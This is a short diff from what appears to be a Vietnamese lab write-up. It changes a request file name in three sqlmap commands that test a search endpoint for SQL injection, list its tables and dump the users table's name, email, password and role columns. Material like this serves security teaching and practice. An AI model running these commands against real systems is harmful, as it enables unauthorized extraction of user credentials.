@@ -58,9 +58,9 @@ Lab 3 dùng đúng kỹ thuật Fuzzer nhưng nạp dải số: trước hết g
 
 **Lab 2 — sqlmap (SQL Injection):**
 ```bash
-sqlmap -r search.req --batch                                  # xác nhận injectable
-sqlmap -r search.req --batch --tables                         # liệt kê bảng
-sqlmap -r search.req --batch -T users -C "name,email,password,role" --dump
+sqlmap -r search.raw --batch                                  # xác nhận injectable
+sqlmap -r search.raw --batch --tables                         # liệt kê bảng
+sqlmap -r search.raw --batch -T users -C "name,email,password,role" --dump
 ```
 > SQLite: dùng `--tables` trực tiếp; `--dump` cần chỉ cột `-C`.
 
